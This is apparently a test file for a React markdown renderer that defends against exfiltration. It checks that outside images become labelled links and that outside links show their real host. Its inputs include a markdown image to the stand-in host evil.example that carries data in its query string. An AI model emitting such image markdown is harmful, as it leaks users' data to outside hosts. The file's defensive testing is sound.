import { createElement, type ComponentProps } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { expect, it } from "vitest";
import SafeMarkdown, { outsideHost } from "../src/lib/safe-markdown";

const render = (text: string, components?: ComponentProps<typeof SafeMarkdown>["components"]) =>
  renderToStaticMarkup(createElement(SafeMarkdown, { components }, text));

it("turns an image from outside the install into a link that names its host", () => {
  const html = render("![chart](https://evil.example/p.png?d=revenue-4120)");
  expect(html).not.toContain("<img");
  expect(html).toContain('href="https://evil.example/p.png?d=revenue-4120"');
  expect(html).toContain('rel="noopener noreferrer"');
  expect(html).toContain("Image: chart");
  expect(html).toContain("(evil.example)");
});

it("keeps an image of the install and a data image", () => {
  expect(render("![a](/api/v1/work/files/runs/x/a.png)")).toContain('<img src="/api/v1/work/files/runs/x/a.png" alt="a"/>');
  expect(render("![b](data:image/png;base64,AAAA)")).toContain("<img");
});

it("opens an outside link in a new tab with no referrer and shows the real host", () => {
  const html = render("[your invoice](https://evil.example/c?d=1)");
  expect(html).toContain('target="_blank"');
  expect(html).toContain('rel="noopener noreferrer"');
  expect(html).toContain('referrerPolicy="no-referrer"');
  expect(html).toContain("your invoice<span");
  expect(html).toContain("(evil.example)");
  expect(render("[docs.example.com guide](https://docs.example.com/a)")).not.toContain("markdown-link-host");
});

it("leaves a link of the install alone and keeps the caller's link component", () => {
  expect(render("[run](/runs/1)")).toBe('<p><a href="/runs/1">run</a></p>');
  const html = render("[x](https://evil.example/)", { a: (p) => createElement("a", { ...p, className: "cite" }) });
  expect(html).toContain('class="cite"');
  expect(html).toContain('rel="noopener noreferrer"');
});

it("finds the host only for http and https URLs outside the install", () => {
  expect(outsideHost("mailto:a@b.c")).toBeNull();
  expect(outsideHost("/x")).toBeNull();
  expect(outsideHost("//evil.example/x")).toBe("evil.example");
});

it("renders markdown only through SafeMarkdown", () => {
  const offenders: string[] = [];
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      const path = join(dir, name);
      if (statSync(path).isDirectory()) walk(path);
      else if (/\.tsx?$/.test(name) && !path.endsWith(join("lib", "safe-markdown.tsx")) &&
        readFileSync(path, "utf8").includes('from "react-markdown"')) offenders.push(path);
    }
  };
  walk(join(__dirname, "..", "src"));
  expect(offenders).toEqual([]);
});
